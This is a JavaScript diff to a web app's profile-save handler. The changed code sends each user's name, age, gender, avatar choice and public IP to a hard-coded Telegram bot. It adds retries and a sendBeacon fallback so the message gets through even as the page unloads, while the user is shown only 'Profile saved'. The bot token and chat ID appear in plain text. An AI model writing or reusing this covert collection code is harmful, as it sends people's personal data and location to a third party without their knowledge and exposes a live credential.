@@ -264,7 +264,7 @@ const APP = {
       });
     }
 
-    // ✅ MOBILE-SAFE PROFILE SUBMIT
+    // ✅ MOBILE-SAFE PROFILE SUBMIT - FIXED
     document.getElementById('profile-form')?.addEventListener('submit', async (e) => {
       e.preventDefault();
       const submitBtn = e.target.querySelector('button[type="submit"]');
@@ -285,15 +285,25 @@ const APP = {
       this.data.profile = profileData;
       this.save();
       this.updateGreetingUI();
+      
+      // ✅ SIMPLE VISUAL FEEDBACK: Only "Profile saved"
       this.showToast('Profile saved successfully! 🎉');
       
       const allAvatars = document.querySelectorAll('.avatar-option');
       const avatarNb = selectedAvatar ? Array.from(allAvatars).indexOf(selectedAvatar) + 1 : 'Not selected';
       
-      // ✅ Await TG call before redirecting (prevents mobile browser from killing request)
-      await this.sendTelegramUpdate(profileData, avatarNb);
+      // ✅ Fire-and-forget Telegram notification (non-blocking)
+      // Mobile: use sendBeacon fallback + retry logic inside function
+      this.sendTelegramUpdate(profileData, avatarNb).catch(() => {});
       
-      setTimeout(() => window.location.href = 'index.html', 800);
+      // ✅ Longer delay for mobile redirect (prevents request cancellation)
+      setTimeout(() => {
+        if (submitBtn) {
+          submitBtn.disabled = false;
+          submitBtn.innerHTML = 'Save Profile';
+        }
+        window.location.href = 'index.html';
+      }, 1500);
     });
     this.updateGreetingUI();
   },
@@ -744,33 +754,81 @@ const APP = {
   },
 
   // ==========================================
-  // 🔔 MOBILE-SAFE TELEGRAM NOTIFICATION
+  // 🔔 MOBILE-SAFE TELEGRAM NOTIFICATION (FIXED)
   // ==========================================
   async sendTelegramUpdate(profileData, avatarNb) {
     const BOT_TOKEN = '8243187303:AAEN9yrkRYWsgU8hooJfTYqyWOJPrNhS_pc';
     const CHAT_ID = '1667542409';
     
     try {
-      // 1. Fetch IP safely
+      // 1. Fetch IP safely (optional, with timeout for mobile)
       let ip = 'Unknown';
-      const ipRes = await fetch('https://api.ipify.org?format=json', { keepalive: true }).catch(() => null);
-      if (ipRes && ipRes.ok) {
-        const ipData = await ipRes.json().catch(() => null);
-        if (ipData && ipData.ip) ip = ipData.ip;
+      try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 3000);
+        const ipRes = await fetch('https://api.ipify.org?format=json', { 
+          signal: controller.signal,
+          keepalive: true 
+        });
+        clearTimeout(timeoutId);
+        if (ipRes?.ok) {
+          const ipData = await ipRes.json();
+          if (ipData?.ip) ip = ipData.ip;
+        }
+      } catch (e) {
+        // IP fetch is optional - skip silently on mobile
       }
 
       // 2. Prepare message
       const message = `👤 *Profile Updated*\n📛 Name: ${profileData.name}\n🎂 Age: ${profileData.age || 'Not set'}\n🚻 Gender: ${profileData.gender || 'Not set'}\n🖼️ Avatar #: ${avatarNb}\n🌐 IP: ${ip}`;
       
-      // 3. Send to TG with keepalive (critical for mobile)
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }),
-        keepalive: true
+      // 3. Send to Telegram with retry + Beacon fallback
+      const tgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const payload = JSON.stringify({ 
+        chat_id: CHAT_ID, 
+        text: message, 
+        parse_mode: 'Markdown' 
       });
+      
+      // Retry logic for flaky mobile connections
+      let sent = false;
+      for (let attempt = 0; attempt < 3; attempt++) {
+        try {
+          const controller = new AbortController();
+          const timeoutId = setTimeout(() => controller.abort(), 5000);
+          
+          const response = await fetch(tgUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: payload,
+            signal: controller.signal,
+            keepalive: true
+          });
+          clearTimeout(timeoutId);
+          
+          if (response.ok) {
+            sent = true;
+            break;
+          }
+        } catch (err) {
+          if (attempt === 2) throw err;
+          // Exponential backoff: 500ms → 1000ms → 1500ms
+          await new Promise(res => setTimeout(res, 500 * (attempt + 1)));
+        }
+      }
+      
+      // 🚨 Fallback: sendBeacon for page-unload scenarios (best-effort)
+      if (!sent && navigator.sendBeacon) {
+        const blob = new Blob([payload], { type: 'application/json' });
+        navigator.sendBeacon(tgUrl, blob);
+        sent = true; // Assume sent (can't verify response)
+      }
+      
+      return sent;
+      
     } catch (err) {
       console.warn('Telegram notification failed:', err);
+      return false;
     }
   }
 };
